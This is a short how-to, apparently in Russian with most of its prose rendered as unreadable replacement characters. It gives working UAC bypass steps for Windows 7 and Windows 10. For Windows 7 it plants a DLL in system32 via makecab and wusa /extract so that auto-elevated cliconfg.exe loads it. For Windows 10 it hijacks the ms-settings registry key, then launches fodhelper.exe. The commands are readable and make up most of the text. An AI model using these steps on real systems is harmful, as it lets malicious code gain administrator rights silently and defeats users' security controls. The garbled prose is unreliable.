����� ���� UAC Windows 7 - Windows 10 (RAD Studio XE7)

Windows 7
��� Dll (���  64 ��� � 32 ���) ������� � .cab ����� �������� �� cmd � ������� ��������������  
(������: makecab "C:\dll\Win64\ntwdblib.dll" "C:\ntwdblib64.cab")
ntwdblib32.cab � ntwdblib64.cab ��� ���������� � ���� �������� �����, � ������� execonsole.
���������� ���������� �������� �� ������ ������ "%systemroot%\system32\cliconfg.exe"
����������, � �������� ����������� ���������� "%systemroot%\system32\wusa.exe" (�� ���� � ����� ������ windows) 
(������: wusa "%temp%\ntwdblib.cab" /quiet /extract:%systemroot%\system32\)
������ ���������� ntwdblib64.cab ��� ntwdblib32.cab � ����������� �� ����������� 
� ���������� "%systemroot%\system32\ntwdblib.dll"
��������� ������� "%systemroot%\system32\cliconfg.exe" � ������� ������������, �� �������� ��� �� ��������� � ����� ������ windows
�� ��������� ���� � ������������ �������������� � ���������� ���� dll ���������� "%systemroot%\system32\ntwdblib.dll"
� ����� � ��� ��� ��������� ����� �������������� � �������� ��������� ����� PE ���� � ����� ���� UAC. 

Windows 10
���������� ���������� �������� �� ������ ������ "fodhelper.exe" 
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "���� �� ������ �����" -Force
powershell New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
powershell Start-Process "fodhelper.exe"
powershell Remove-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Recurse -Force



